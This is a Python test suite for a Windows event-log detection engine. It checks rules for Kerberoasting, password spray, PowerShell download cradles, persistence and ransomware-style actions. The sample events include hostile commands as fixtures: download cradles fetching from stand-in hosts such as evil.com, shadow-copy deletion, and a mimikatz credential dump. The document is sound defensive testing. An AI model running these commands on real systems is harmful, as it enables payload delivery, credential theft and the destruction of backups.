"""
FLARE v0.4 - Rule Engine Test Suite
Runs entirely without pywin32/Windows services.
"""
import sys, json
sys.path.insert(0, '.')
sys.path.insert(0, 'host')

from host.rules import ALL_RULES, RuleState
from host.ioc_loader import IOCLoader
from host.host_engine import parse_event_xml

ioc   = IOCLoader()
state = RuleState()
PASS  = 0
FAIL  = 0

def check(name, event, expected_rule, should_fire=True):
    global PASS, FAIL
    results = []
    for fn in ALL_RULES:
        r = fn(event, ioc, state)
        if r:
            results.append(r)
    matched = [r for r in results if r.rule_id == expected_rule]
    if should_fire and matched:
        r = matched[0]
        extra = f"  other_fired={[x.rule_id for x in results if x.rule_id != expected_rule]}" if len(results) > 1 else ""
        print(f"  PASS  [{r.rule_id}]  conf={r.confidence}{extra}  ({name})")
        PASS += 1
        return r
    elif should_fire and not matched:
        fired = [r.rule_id for r in results]
        print(f"  FAIL  expected [{expected_rule}] -- fired: {fired}  ({name})")
        FAIL += 1
        return None
    elif not should_fire and not any(r.rule_id == expected_rule for r in results):
        print(f"  PASS  [{expected_rule}] correctly silent  ({name})")
        PASS += 1
        return None
    else:
        print(f"  FAIL  [{expected_rule}] fired but should not have  ({name})")
        FAIL += 1
        return None

def section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print('='*60)

# ─────────────────────────────────────────────────────────────────────
section("IOC Loader")
# ─────────────────────────────────────────────────────────────────────
print(f"  Stats: {json.dumps(ioc.stats)}")
assert ioc.stats['domains']        > 0, "No domains loaded"
assert ioc.stats['ip_ranges']      > 0, "No IPs loaded"
assert ioc.stats['process_names']  > 0, "No process names loaded"
assert ioc.stats['process_chains'] > 0, "No process chains loaded"
print("  PASS  All IOC lists populated")
PASS += 1

# spot-check known IOC entries
dom_hit  = ioc.match_domain("cmstrack.top")
proc_hit = ioc.match_process(r"C:\Users\bob\Downloads\mimikatz.exe")
chain_hit = ioc.match_chain(r"C:\Program Files\Microsoft Office\winword.exe",
                             r"C:\Windows\System32\powershell.exe")
print(f"  domain match 'cmstrack.top': {dom_hit!r}")
print(f"  process match 'mimikatz.exe': {proc_hit!r}")
print(f"  chain match 'winword->powershell': {chain_hit!r}")

# ─────────────────────────────────────────────────────────────────────
section("XML Parser")
# ─────────────────────────────────────────────────────────────────────
SAMPLE_4688 = r"""
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Security-Auditing'/>
    <EventID>4688</EventID>
    <Level>0</Level>
    <Channel>Security</Channel>
    <Computer>DESKTOP-TEST</Computer>
    <TimeCreated SystemTime='2025-01-15T10:30:00.000000000Z'/>
  </System>
  <EventData>
    <Data Name='SubjectUserName'>SYSTEM</Data>
    <Data Name='NewProcessName'>C:\Windows\System32\vssadmin.exe</Data>
    <Data Name='CommandLine'>vssadmin.exe delete shadows /all /quiet</Data>
    <Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data>
  </EventData>
</Event>"""

parsed = parse_event_xml(SAMPLE_4688)
assert parsed.get('event_id') == 4688,         f"event_id wrong: {parsed.get('event_id')}"
assert parsed.get('channel')  == 'Security',   f"channel wrong: {parsed.get('channel')}"
assert 'vssadmin' in parsed.get('NewProcessName',''), f"NewProcessName not parsed"
assert 'delete shadows' in parsed.get('CommandLine',''), f"CommandLine not parsed"
print("  PASS  Event 4688 XML parsed correctly")
PASS += 1

SAMPLE_4104 = r"""
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-PowerShell'/>
    <EventID>4104</EventID>
    <Level>3</Level>
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DESKTOP-TEST</Computer>
    <TimeCreated SystemTime='2025-01-15T10:31:00.000000000Z'/>
  </System>
  <EventData>
    <Data Name='ScriptBlockText'>IEX (New-Object Net.WebClient).DownloadString('http://evil.com/pay.ps1')</Data>
    <Data Name='Path'></Data>
  </EventData>
</Event>"""

parsed4104 = parse_event_xml(SAMPLE_4104)
assert parsed4104.get('event_id') == 4104
assert 'IEX' in parsed4104.get('ScriptBlockText', '')
print("  PASS  Event 4104 XML parsed correctly")
PASS += 1

# Bad XML
parsed_bad = parse_event_xml("<broken xml <><>")
assert parsed_bad == {}, f"Bad XML should return empty dict, got: {parsed_bad}"
print("  PASS  Malformed XML returns empty dict (no crash)")
PASS += 1

# ─────────────────────────────────────────────────────────────────────
section("Credential Access Rules")
# ─────────────────────────────────────────────────────────────────────
check("Kerberoasting RC4 service ticket",
      {'event_id': 4769, 'TicketEncryptionType': '0x17',
       'ServiceName': 'MSSQLSvc/db01.corp.local:1433',
       'TargetUserName': 'sqlsvc', 'ClientAddress': '10.0.0.5'},
      'kerberoasting_rc4')

check("Kerberoasting decimal RC4 (23)",
      {'event_id': 4769, 'TicketEncryptionType': '23',
       'ServiceName': 'http/web01', 'TargetUserName': 'websvc'},
      'kerberoasting_rc4')

check("Machine account ticket ignored (ends with $)",
      {'event_id': 4769, 'TicketEncryptionType': '0x17',
       'ServiceName': 'DC01$'},
      'kerberoasting_rc4', should_fire=False)

check("AES-256 ticket (0x12) not flagged",
      {'event_id': 4769, 'TicketEncryptionType': '0x12',
       'ServiceName': 'MSSQLSvc/db01', 'TargetUserName': 'sqlsvc'},
      'kerberoasting_rc4', should_fire=False)

check("AS-REP roasting pre-auth=0",
      {'event_id': 4768, 'PreAuthType': '0',
       'TargetUserName': 'jdoe', 'IpAddress': '10.0.0.9'},
      'asrep_roasting')

check("Normal Kerberos AS-REQ pre-auth=2",
      {'event_id': 4768, 'PreAuthType': '2', 'TargetUserName': 'jdoe'},
      'asrep_roasting', should_fire=False)

# Brute force threshold test
state_bf = RuleState()
fired_at = None
for i in range(1, 20):
    ev = {'event_id': 4625, 'IpAddress': '10.99.0.1', 'TargetUserName': f'user{i%2}'}
    for fn in ALL_RULES:
        r = fn(ev, ioc, state_bf)
        if r and r.rule_id == 'brute_force_logon' and fired_at is None:
            fired_at = i
if fired_at == 10:
    print(f"  PASS  [brute_force_logon]  threshold=10, fired at attempt #{fired_at}")
    PASS += 1
else:
    print(f"  FAIL  [brute_force_logon]  fired at #{fired_at} (expected 10)")
    FAIL += 1

# Fix 5 — dedup: 20 events above threshold must produce exactly 1 alert
fire_count = 0
state_bf2 = RuleState()
for i in range(20):
    ev = {'event_id': 4625, 'IpAddress': '10.1.1.200', 'TargetUserName': 'admin'}
    for fn in ALL_RULES:
        r = fn(ev, ioc, state_bf2)
        if r and r.rule_id == 'brute_force_logon':
            fire_count += 1
if fire_count == 1:
    print(f"  PASS  [brute_force_logon] dedup: exactly 1 alert for 20-event burst (Fix 5)")
    PASS += 1
else:
    print(f"  FAIL  [brute_force_logon] dedup: {fire_count} alerts for 20 events (expected 1)")
    FAIL += 1

# Password spray — threshold fires at 5 distinct users
state_ps = RuleState()
spray_fired = False
for i in range(7):
    ev = {'event_id': 4625, 'IpAddress': '10.5.5.5', 'TargetUserName': f'user{i}'}
    for fn in ALL_RULES:
        r = fn(ev, ioc, state_ps)
        if r and r.rule_id == 'password_spray' and not spray_fired:
            print(f"  PASS  [password_spray] fired at {i+1} distinct users (threshold=5)")
            PASS += 1
            spray_fired = True
if not spray_fired:
    print("  FAIL  [password_spray] never fired")
    FAIL += 1

# Fix 5 — dedup: 12 more events beyond threshold must produce exactly 1 more alert
spray_count = 0
state_ps2 = RuleState()
# Seed 6 distinct users to pass threshold
for i in range(6):
    ev = {'event_id': 4625, 'IpAddress': '10.5.5.99', 'TargetUserName': f'victim{i}'}
    for fn in ALL_RULES:
        r = fn(ev, ioc, state_ps2)
        if r and r.rule_id == 'password_spray':
            spray_count += 1
# Send 10 more — should NOT generate additional alerts
for i in range(10):
    ev = {'event_id': 4625, 'IpAddress': '10.5.5.99', 'TargetUserName': f'victim{i%6}'}
    for fn in ALL_RULES:
        r = fn(ev, ioc, state_ps2)
        if r and r.rule_id == 'password_spray':
            spray_count += 1
if spray_count == 1:
    print(f"  PASS  [password_spray] dedup: exactly 1 alert for 16-event burst (Fix 5)")
    PASS += 1
else:
    print(f"  FAIL  [password_spray] dedup: {spray_count} alerts (expected 1)")
    FAIL += 1

# ─────────────────────────────────────────────────────────────────────
section("PowerShell Detection Rules")
# ─────────────────────────────────────────────────────────────────────
check("IEX DownloadString",
      {'event_id': 4104, 'ScriptBlockText':
       "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
       'Path': ''},
      'ps_download_cradle')

check("Invoke-WebRequest download",
      {'event_id': 4104, 'ScriptBlockText':
       "Invoke-WebRequest -Uri http://c2.io/stage2 -OutFile C:/tmp/s2.exe",
       'Path': ''},
      'ps_download_cradle')

check("Start-BitsTransfer",
      {'event_id': 4104, 'ScriptBlockText':
       "Start-BitsTransfer -Source http://evil.com/payload -Destination C:/tmp/",
       'Path': ''},
      'ps_download_cradle')

check("Legitimate Get-Content (no cradle)",
      {'event_id': 4104, 'ScriptBlockText':
       "Get-Content C:/logs/app.log | Select-Object -First 100",
       'Path': ''},
      'ps_download_cradle', should_fire=False)

check("Base64 FromBase64String",
      {'event_id': 4104, 'ScriptBlockText':
       "[System.Convert]::FromBase64String('SQBFAFgA')",
       'Path': ''},
      'ps_encoded_command')

check("-EncodedCommand flag",
      {'event_id': 4104, 'ScriptBlockText':
       "powershell.exe -EncodedCommand SQBFAFgAIA==",
       'Path': ''},
      'ps_encoded_command')

# Edge case: ToBase64String is in the pattern -- this WILL fire, which is a false-positive risk
r = check("ToBase64String (encoding data -- FP risk?)",
      {'event_id': 4104, 'ScriptBlockText':
       "$b = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('hello world'))",
       'Path': ''},
      'ps_encoded_command')
if r:
    print(f"  NOTE  ToBase64String triggers ps_encoded_command -- potential false positive")

check("Reflection Assembly load",
      {'event_id': 4104, 'ScriptBlockText':
       "[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:/evil.dll'))",
       'Path': ''},
      'ps_reflection_load')

check("GetMethod invoke",
      {'event_id': 4104, 'ScriptBlockText':
       "$t.GetMethod('EntryPoint').Invoke($null, $null)",
       'Path': ''},
      'ps_reflection_load')

# ─────────────────────────────────────────────────────────────────────
section("Persistence Rules")
# ─────────────────────────────────────────────────────────────────────
check("PSEXESVC exact match",
      {'event_id': 7045, 'ServiceName': 'PSEXESVC',
       'ImagePath': r'C:\Windows\PSEXESVC.exe', 'AccountName': 'SYSTEM'},
      'psexec_lateral_movement')

check("PSEXESVC lowercase (rule is case-insensitive via .upper())",
      {'event_id': 7045, 'ServiceName': 'psexesvc',
       'ImagePath': r'C:\Windows\psexesvc.exe', 'AccountName': 'SYSTEM'},
      'psexec_lateral_movement', should_fire=True)  # .upper() handles any capitalisation

check("Service in AppData",
      {'event_id': 7045, 'ServiceName': 'EvilSvc',
       'ImagePath': r'C:\Users\bob\AppData\Roaming\svch0st.exe',
       'AccountName': 'bob'},
      'new_service_suspicious_path')

check("Service in Temp",
      {'event_id': 7045, 'ServiceName': 'TmpSvc',
       'ImagePath': r'C:\Windows\Temp\mal.exe',
       'AccountName': 'SYSTEM'},
      'new_service_suspicious_path')

check("Service in Desktop",
      {'event_id': 7045, 'ServiceName': 'DeskSvc',
       'ImagePath': r'C:\Users\bob\Desktop\hack.exe',
       'AccountName': 'bob'},
      'new_service_suspicious_path')

check("Legitimate service in Program Files",
      {'event_id': 7045, 'ServiceName': 'MySoftware',
       'ImagePath': r'C:\Program Files\MySoftware\svc.exe',
       'AccountName': 'SYSTEM'},
      'new_service_suspicious_path', should_fire=False)

check("Legitimate service in Windows",
      {'event_id': 7045, 'ServiceName': 'WinSvc',
       'ImagePath': r'C:\Windows\System32\svchost.exe',
       'AccountName': 'SYSTEM'},
      'new_service_suspicious_path', should_fire=False)

check("WMI event subscription",
      {'event_id': 5861, 'Namespace': r'root\subscription',
       'Query': 'SELECT * FROM __InstanceCreationEvent WITHIN 30',
       'Name': 'MalFilter', 'Consumer': 'CommandLineConsumer'},
      'wmi_persistence')

check("Suspicious task with powershell",
      {'event_id': 4698, 'TaskName': 'WindowsUpdater',
       'TaskContentXml': '<Exec><Command>powershell.exe</Command><Arguments>-enc AAAB</Arguments></Exec>',
       'SubjectUserName': 'SYSTEM'},
      'scheduled_task_suspicious')

check("Suspicious task in AppData",
      {'event_id': 4698, 'TaskName': 'UpdateHelper',
       'TaskContentXml': r'<Exec><Command>C:\Users\bob\AppData\Local\update.exe</Command></Exec>',
       'SubjectUserName': 'bob'},
      'scheduled_task_suspicious')

check("Legitimate task (cleanmgr)",
      {'event_id': 4698, 'TaskName': 'DiskCleanup',
       'TaskContentXml': '<Exec><Command>cleanmgr.exe</Command></Exec>',
       'SubjectUserName': 'SYSTEM'},
      'scheduled_task_suspicious', should_fire=False)

# ─────────────────────────────────────────────────────────────────────
section("Defense Evasion / Impact")
# ─────────────────────────────────────────────────────────────────────
check("Audit policy changed",
      {'event_id': 4719, 'SubcategoryId': '{0cce922b}',
       'AuditPolicyChanges': 'Success removed',
       'SubjectUserName': 'attacker'},
      'audit_policy_changed')

check("Defender RT disabled (5001)",
      {'event_id': 5001, 'computer': 'DESKTOP-1'},
      'defender_disabled')

check("Defender scanning disabled (5010)",
      {'event_id': 5010, 'computer': 'DESKTOP-1'},
      'defender_disabled')

check("Shadow copy deletion vssadmin",
      {'event_id': 4688,
       'NewProcessName': r'C:\Windows\System32\vssadmin.exe',
       'CommandLine': 'vssadmin.exe delete shadows /all /quiet',
       'ParentProcessName': r'C:\Windows\System32\cmd.exe'},
      'shadow_copy_deletion')

check("Shadow copy via wmic",
      {'event_id': 4688,
       'NewProcessName': r'C:\Windows\System32\wbem\wmic.exe',
       'CommandLine': 'wmic shadowcopy delete',
       'ParentProcessName': r'C:\Windows\System32\cmd.exe'},
      'shadow_copy_deletion')

check("Normal vssadmin list (no delete)",
      {'event_id': 4688,
       'NewProcessName': r'C:\Windows\System32\vssadmin.exe',
       'CommandLine': 'vssadmin.exe list shadows',
       'ParentProcessName': r'C:\Windows\System32\cmd.exe'},
      'shadow_copy_deletion', should_fire=False)

check("Notepad (no alert)",
      {'event_id': 4688,
       'NewProcessName': r'C:\Windows\notepad.exe',
       'CommandLine': 'notepad.exe readme.txt',
       'ParentProcessName': r'C:\Windows\explorer.exe'},
      'shadow_copy_deletion', should_fire=False)

# ─────────────────────────────────────────────────────────────────────
section("Privilege Escalation")
# ─────────────────────────────────────────────────────────────────────
check("User added to Administrators",
      {'event_id': 4732, 'GroupName': 'Administrators',
       'MemberName': r'CORP\evil', 'SubjectUserName': 'attacker'},
      'privileged_group_modification')

check("User added to Domain Admins",
      {'event_id': 4728, 'GroupName': 'Domain Admins',
       'MemberName': r'CORP\new_da', 'SubjectUserName': 'bob'},
      'privileged_group_modification')

check("User added to Schema Admins",
      {'event_id': 4756, 'GroupName': 'Schema Admins',
       'MemberName': r'CORP\alice', 'SubjectUserName': 'admin'},
      'privileged_group_modification')

check("Added to Marketing group (no alert)",
      {'event_id': 4732, 'GroupName': 'Marketing',
       'MemberName': r'CORP\alice', 'SubjectUserName': 'hr'},
      'privileged_group_modification', should_fire=False)

# ─────────────────────────────────────────────────────────────────────
section("Log Cleared")
# ─────────────────────────────────────────────────────────────────────
check("Security log cleared",
      {'event_id': 1102, 'SubjectUserName': 'attacker',
       'computer': 'DESKTOP-1', 'timestamp': '2025-01-01T00:00:00Z'},
      'security_log_cleared')

# ─────────────────────────────────────────────────────────────────────
section("IOC Rules")
# ─────────────────────────────────────────────────────────────────────
check("IOC domain match",
      {'event_id': 3008, 'QueryName': 'cmstrack.top',
       'QueryResults': 'NXDOMAIN'},
      'ioc_domain_match')

check("Unknown domain (no match)",
      {'event_id': 3008, 'QueryName': 'google.com',
       'QueryResults': '142.250.80.46'},
      'ioc_domain_match', should_fire=False)

check("IOC process name (mimikatz)",
      {'event_id': 4688,
       'NewProcessName': r'C:\Users\bob\Downloads\mimikatz.exe',
       'CommandLine': 'mimikatz.exe sekurlsa::logonpasswords',
       'ParentProcessName': r'C:\Windows\System32\cmd.exe',
       'SubjectUserName': 'bob'},
      'ioc_process_name')

check("IOC process chain winword->powershell",
      {'event_id': 4688,
       'ParentProcessName': r'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE',
       'NewProcessName': r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
       'CommandLine': 'powershell.exe -WindowStyle Hidden -enc AAAA',
       'SubjectUserName': 'bob'},
      'ioc_process_chain')

# ─────────────────────────────────────────────────────────────────────
section("Edge Cases")
# ─────────────────────────────────────────────────────────────────────
# Wrong event_id -- nothing should fire
wrong_eid = {'event_id': 9999, 'foo': 'bar'}
fired = [fn(wrong_eid, ioc, state) for fn in ALL_RULES]
fired = [r for r in fired if r is not None]
if not fired:
    print("  PASS  Unknown event ID fires no rules")
    PASS += 1
else:
    print(f"  FAIL  Unknown event ID fired: {[r.rule_id for r in fired]}")
    FAIL += 1

# Empty event
empty_ev = {'event_id': 4688}
try:
    for fn in ALL_RULES:
        fn(empty_ev, ioc, state)
    print("  PASS  Empty event dict handled without crash")
    PASS += 1
except Exception as e:
    print(f"  FAIL  Empty event dict crashed: {e}")
    FAIL += 1

# PSEXESVC case sensitivity test
r = None
for fn in ALL_RULES:
    r2 = fn({'event_id': 7045, 'ServiceName': 'psexesvc',
             'ImagePath': r'C:\Windows\psexesvc.exe'}, ioc, state)
    if r2 and r2.rule_id == 'psexec_lateral_movement':
        r = r2
if r:
    print(f"  NOTE  [psexec_lateral_movement] case-insensitive check needed: 'psexesvc' (lower) fired={r is not None}")
else:
    print(f"  WARN  [psexec_lateral_movement] CASE BUG: 'psexesvc' lowercase did NOT fire (rule uses .upper() but only checks == 'PSEXESVC')")
    print(f"        In real Windows logs ServiceName may be mixed-case")

print()
print("="*60)
print(f"  FINAL: {PASS+FAIL} tests  PASS={PASS}  FAIL={FAIL}")
print("="*60)
